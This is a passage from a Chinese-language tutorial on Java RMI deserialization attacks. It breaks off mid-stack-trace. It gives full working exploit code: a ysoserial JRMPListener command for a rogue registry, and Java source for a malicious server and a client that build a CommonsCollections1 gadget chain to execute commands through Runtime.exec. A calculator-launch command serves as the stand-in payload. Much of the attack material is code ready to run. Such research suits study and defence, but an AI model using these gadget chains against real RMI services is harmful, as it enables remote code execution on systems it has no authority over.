            ObjectOutput var3 = var2.getOutputStream();
            var3.writeObject(r);
            ref.invoke(var2);
        }
    }
当然，unbind也是同样的流程，这里就不重新再写一次了。
## 攻击客户端
### 注册中心攻击客户端
PS：此方式可攻击客户端或服务端。
在通信过程中，RMI与注册中心以及服务端进行了交互，我们需要对这两者做手脚，从而达到攻击客户端的目的。
对于注册中心来说，我们还是从这几个方法触发：
  * bind
  * unbind
  * rebind
  * list
  * lookup
这里的每个方法，除了unbind和rebind，其他的都会返回数据给客户端，此时的数据是序列化的数据，所以客户端自然也会反序列化，那么我们只需要伪造注册中心的返回数据，就可以达到攻击客户端的效果啦。
这里yso的JRMPListener已经做好了，命令如下：
    java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 12345  CommonsCollections1 'open  /System/Applications/Calculator.app'
Client Demo：
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class Client {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",12345);
            registry.list();
        }
    }
比较有意思的是，我发现这里即使调用unbind也会触发反序列化，推测是在之前传输一些约定好的数据时进行的序列化和反序列化。
所以实际上这五种方法都可以达到注册中心反打客户端或服务端的目的。
### 服务端攻击客户端
服务端攻击客户端，大抵可以分为以下两种情景。
1.可以使用codebase 2.服务端返回参数为Object对象
先写第二种。
#### 服务端返回参数为Object对象
在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。
所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。
这里我还是以cc1为例，简单的演示一下。
恶意UserImpl：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import java.io.Serializable;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    import java.util.HashMap;
    import java.util.Map;
    public class LocalUser extends UnicastRemoteObject implements User  {
        public String name;
        public int age;
        public LocalUser(String name, int age) throws RemoteException {
            super();
            this.name = name;
            this.age = age;
        }
        public Object getUser(){
            InvocationHandler handler = null;
            try {
                ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[]{
                                String.class, Class[].class}, new Object[]{
                                "getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke", new Class[]{
                                Object.class, Object[].class}, new Object[]{
                                null, new Object[0]}),
                        new InvokerTransformer("exec",
                                new Class[]{String.class}, new Object[]{"open  /System/Applications/Calculator.app"})});
                HashMap innermap = new HashMap();
                Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
                Constructor[] constructors = clazz.getDeclaredConstructors();
                Constructor constructor = constructors[0];
                constructor.setAccessible(true);
                Map map = (Map) constructor.newInstance(innermap, chain);
                Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
                handler_constructor.setAccessible(true);
                InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map); //创建第一个代理的handler
                Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler); //创建proxy对象
                Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
                AnnotationInvocationHandler_Constructor.setAccessible(true);
                handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);
            }catch(Exception e){
                e.printStackTrace();
            }
            return (Object)handler;
        }
        public String getName(){
            return "["+this.name+"]";
        }
        public void updateName(String name){
            this.name = name;
        }
        public void addUser(Object user) throws RemoteException {
        }
    }
恶意服务端：
    import java.rmi.AlreadyBoundException;
    import java.rmi.NotBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.concurrent.CountDownLatch;
    public class Server {
        public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException, NotBoundException {
            User liming = new LocalUser("liming",15);
            Registry registry = LocateRegistry.createRegistry(8888);
            registry.bind("user",liming);
            System.out.println("registry is running...");
            System.out.println("liming is bind in registry");
            CountDownLatch latch=new CountDownLatch(1);
            latch.await();
        }
    }
此时当客户端调用服务端绑定的远程对象的getUser方法时，将反序列化服务端传来的恶意远程对象。此时将触发Rce。
当然，这种前提是客户端也要有对应的gadget才行。
#### 远程加载对象
这个条件十分十分苛刻，在现实生活中基本不可能碰到。
当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。
具体可以参考这篇文章，利用条件太过于苛刻了：https://paper.seebug.org/1091/#serverrmi-server
java.security.policy这个默认是没有配置的，需要我们手动去配置。
## 攻击服务端
如何攻击服务端呢？上面已经说了用注册中心反打服务端的操作，接下来就是说客户端如何攻击服务端了。
### 当服务端的远程方法存在Object参数的情况下
在上上面写了，如果服务端的某个方法，传递的参数是Object类型的参数，当服务端接收数据时，就会调用readObject，所以我们可以从这个角度入手来攻击服务端。
前提：
  * 服务端的某个远程方法传递参数为Object
我们需要先在User接口中新增这么一个方法：
    import java.rmi.RemoteException;
    public interface User extends java.rmi.Remote {
        public String getName() throws RemoteException;;
        public User getUser() throws RemoteException;
        public void updateName(String name) throws RemoteException;;
        public void addUser(Object user) throws RemoteException;
    }
此时多了一个addUser方法，当客户端调用这个方法时候，服务端会对其传递的参数进行反序列化。
Client Demo：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class Client {
        public static void main(String[] args) throws Exception {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map)constructor.newInstance(innermap,chain);
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",8888);
            User user = (User) registry.lookup("user");
            user.addUser(handler);
        }
    }
### 远程加载对象
和上边Server打Client一样，都属于十分十分十分难利用的点。
参考：
## 实现带回显攻击
这里说的带回显攻击，指的是攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。
先看下之前攻击注册中心时采用的方式，我们可以通过bind、lookup、unbind、rebind等方式去攻击注册中心，当我们尝试攻击时，命令确实执行了，不过注册中心的错误也会传递到我们的客户端中：
    Exception in thread "main" java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast to java.util.Set
        at com.sun.proxy.$Proxy2.entrySet(Unknown Source)
        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:329)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:979)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1873)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1777)